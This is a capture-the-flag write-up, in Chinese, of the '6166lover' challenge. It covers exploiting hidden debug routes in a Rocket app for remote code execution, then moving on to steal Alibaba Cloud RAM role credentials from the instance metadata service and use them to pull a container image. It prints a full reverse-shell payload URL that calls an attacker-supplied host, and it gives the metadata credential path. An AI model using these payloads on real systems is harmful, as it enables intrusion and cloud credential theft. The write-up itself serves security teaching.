# 6166lover

## 题目简述

题目是部署在阿里云 ACK 上的 Rocket 应用。应用暴露了 `Cargo.toml` 和二进制，可通过本地 debug 运行或复刻示例 Rocket 应用还原已注册路由；其中隐藏了两个 debug 路由，一个 JavaScript sandbox，一个 Python “sandbox”。Python sandbox 可执行系统命令，但容器启动后 `/flag` 已被删除，因此需要利用云环境信息：从阿里云实例元数据服务读取绑定在节点上的 worker RAM role 临时凭证，再调用容器镜像服务 ACR 的 `GetAuthorizationToken` 获取镜像仓库临时登录凭证，拉取题目镜像并在镜像内寻找 flag。

## 解题过程

1. 首先确认这是一个 Rocket 应用，并且泄露了 `Cargo.toml`。
2. 下载它，找到应用名为 `static-files` 的项并下载二进制文件。
3. 使用 debug 模式运行它，或自己编写一个示例应用来找出已注册的路由。
4. 发现两个 debug 路由都已存在，一个是 js sandbox，另一个是 python “sandbox”。把它们都当作黑盒进行测试即可。
5. 运行 Python 代码实现 RCE。
6. 使用 `ps -ef`，你会发现实例启动后 `/flag` 已被删除。
7. 使用阿里云元数据获取主机实例元数据，以及其上的 worker role。阿里云 ECS/ACK 节点如果绑定了实例 RAM 角色，实例内部可以通过元数据服务获取 STS 临时凭证，不需要硬编码 AccessKey；普通模式常见入口是 `100.100.100.200/latest/meta-data/ram/security-credentials/<RoleName>`。这里的关键不是读取本机文件，而是确认运行环境带有可用于调用云 API 的临时身份。
8. 使用 metadata API 获取临时凭证。
9. 使用临时凭证调用 ACR 的 `GetAuthorizationToken` API。该接口返回用于登录容器镜像服务实例的临时账号和临时密码，返回结果中的临时用户名通常形如 `cr_temp_user`，`authorizationToken` 用作 Docker login 密码。
10. 使用 `cr_temp_user` 作为用户名、`authorizationToken` 作为密码从阿里云镜像仓库拉取镜像。镜像：registry.cn-hangzhou.aliyuncs.com/glzjin/6166lover。你可以从题目域名中推断这些信息：它部署在阿里云杭州区域容器服务（ACK），作者名为 `glzjin`，题目名为 `6166lover`。
11. 拉取后，直接执行 `docker run -it registry.cn-hangzhou.aliyuncs.com/glzjin/6166lover bash`，你可能会在镜像内拿到 flag。谢谢你：

    获取反弹 shell 的方式如下：

    ```
    http://6166lover.cf8a086c34bdb47138be0b5d5b15b067a.cn-hangzhou.alicontainer.com:81/debug/wnihwi2h2i2j1no1_path_wj2mm?code=__import__(%27os%27).system(%27bash -c "bash -i >%26 /dev/tcp/<your_ip>/<your_port> 0>%261"')
    ```

    并且你可能需要想办法 fork 一下你的进程，否则该应用会卡住，因为它部署在带健康检查的 k8s 上。

## 方法总结

本题核心是从应用 RCE 转到云上身份利用。Python debug 路由能拿 shell，但在线容器里的 `/flag` 已在启动后删除，所以真正目标变成读取实例元数据、拿 RAM role 临时凭证、访问 ACR 并拉取题目镜像。

识别信号是 Rocket 应用泄露 `Cargo.toml` 和二进制、debug 模式可列出隐藏路由、`ps -ef` 显示 flag 文件生命周期异常、域名带有 `cn-hangzhou.alicontainer.com` 这类 ACK 部署特征。

复现时要保留三类凭证边界：元数据服务给的是 STS 临时云 API 凭证，`GetAuthorizationToken` 换到的是 ACR 临时 Docker 登录凭证，最终 `docker pull` 需要正确的地域、命名空间和仓库名。

参考资料要点：阿里云 ECS 实例 RAM 角色文档说明实例内部可经元数据服务获取 STS 临时凭证；阿里云 ACR `GetAuthorizationToken` 文档说明该 API 用于获取登录镜像仓库实例的临时账号和临时密码。原文分别见 https://www.alibabacloud.com/help/zh/ecs/user-guide/attach-an-instance-ram-role-to-an-ecs-instance 和 https://help.aliyun.com/zh/acr/developer-reference/api-cr-2018-12-01-getauthorizationtoken。
